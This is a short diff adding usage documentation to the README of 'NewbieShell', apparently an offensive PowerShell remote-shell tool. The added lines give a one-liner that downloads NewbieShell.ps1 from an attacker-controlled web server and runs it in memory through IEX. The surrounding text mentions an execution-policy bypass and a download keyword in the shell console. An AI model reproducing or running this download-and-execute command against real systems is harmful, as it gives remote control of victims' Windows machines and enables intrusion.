@@ -25,6 +25,10 @@ If Powershell.exe is executed, then NewbieShell executes the command "-ep bypass
 
 The third option is via a ps1 file. It is possible to run a web server on the attacker machine and then execute the code with the Powershell IEX command. Please note that in this option the IP address and the port on the ps1 file should be changed.
 
+```
+powershell -c "(iex (New-Object System.Net.Webclient).DownloadString('http://ip/NewbieShell.ps1'))"
+```
+
 ### NewbieShell Console
 All Windows commands can be inserted normally. For example, if you want to download something from a web server, then you have the possibility to execute a download with so-called keywords. The keyword for download is #D
 
